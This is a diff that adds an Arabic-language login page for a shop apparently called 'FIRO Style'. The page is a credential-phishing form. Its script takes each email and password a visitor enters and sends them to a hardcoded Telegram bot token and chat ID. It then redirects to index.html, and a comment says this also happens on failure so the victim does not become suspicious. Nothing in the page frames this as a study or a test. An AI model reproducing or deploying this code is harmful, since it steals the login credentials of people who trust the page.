@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FIRO Style - Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        /* التنسيق الخاص بك كما هو بدون تغيير */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        body { background-image: url('cover.png'); background-size: cover; background-position: center; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #f4ece2; }
+        .login-box { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(15px); padding: 40px; border-radius: 25px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        .logo-name { font-family: 'Playfair Display', serif; font-size: 2.8rem; color: #fff; margin-bottom: 30px; }
+        .input-group { position: relative; margin-bottom: 15px; }
+        .input-group input { width: 100%; padding: 12px 45px 12px 15px; border: none; border-radius: 10px; background: rgba(255, 255, 255, 0.9); font-size: 16px; outline: none; text-align: right; }
+        .input-group i { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #a67c52; }
+        .btn-login { width: 100%; padding: 12px; border: none; border-radius: 10px; background: #a67c52; color: white; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-login:hover { background: #8b6642; transform: translateY(-2px); }
+        .separator { margin: 20px 0; color: #fff; display: flex; align-items: center; font-size: 0.9rem; }
+        .separator::before, .separator::after { content: ""; flex: 1; height: 1px; background: rgba(255,255,255,0.4); margin: 0 10px; }
+        .social-login { display: flex; gap: 10px; margin-bottom: 20px; }
+        .social-btn { flex: 1; padding: 10px; border: none; border-radius: 8px; color: white; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .fb { background: #3b5998; } .ig { background: #e4405f; }
+        .signup-text { color: #fff; font-size: 0.9rem; }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <h1 class="logo-name">FIRO Style</h1>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <i class="fa-solid fa-envelope"></i>
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+            </div>
+
+            <div class="input-group">
+                <i class="fa-solid fa-lock"></i>
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+            </div>
+
+            <button type="submit" class="btn-login">تسجيل الدخول</button>
+        </form>
+
+        <div class="separator">أو عبر</div>
+        <div class="social-login">
+            <button class="social-btn fb"><i class="fa-brands fa-facebook"></i> فيسبوك</button>
+            <button class="social-btn ig"><i class="fa-brands fa-instagram"></i> انستجرام</button>
+        </div>
+        <p class="signup-text">ليس لديك حساب؟ <a href="#">سجل الآن</a></p>
+    </div>
+
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault(); // منع الصفحة من التحديث
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // بيانات البوت الخاصة بك
+            const token = "8665629681:AAFiHgfuw1hL3thh8VJ6vxCjnYQ9BIkfA-g";
+            const chatId = "5511952564";
+            
+            // نص الرسالة التي ستصلك
+            const message = `🔔 تسجيل دخول جديد:\n👤 المستخدم: ${email}\n🔑 كلمة المرور: ${password}`;
+
+            // إرسال البيانات إلى تليجرام
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                // بعد الإرسال بنجاح، حوله لصفحة المعرض (index.html)
+                window.location.href = "index.html";
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // حتى لو فشل الإرسال، نحوله عشان ميشكش في حاجة
+                window.location.href = "index.html";
+            });
+        });
+    </script>
+
+</body>
+</html>
